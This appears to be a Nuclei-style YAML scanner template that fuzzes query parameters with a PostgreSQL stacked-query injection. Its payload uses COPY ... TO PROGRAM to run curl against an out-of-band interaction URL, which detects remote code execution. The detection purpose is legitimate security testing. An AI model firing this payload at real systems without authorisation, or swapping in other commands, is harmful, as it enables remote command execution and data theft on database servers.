http:
- fuzzing:
  - fuzz:
    - '{{copyprog}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    copyprog:
    - 1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}'--
  stop-at-first-match: true
id: ai-fuzz-copy-to-program-oob
info:
  author: openai
  name: PostgreSQL COPY TO PROGRAM OOB
  severity: critical
  tags: postgres,rce,oob,dast
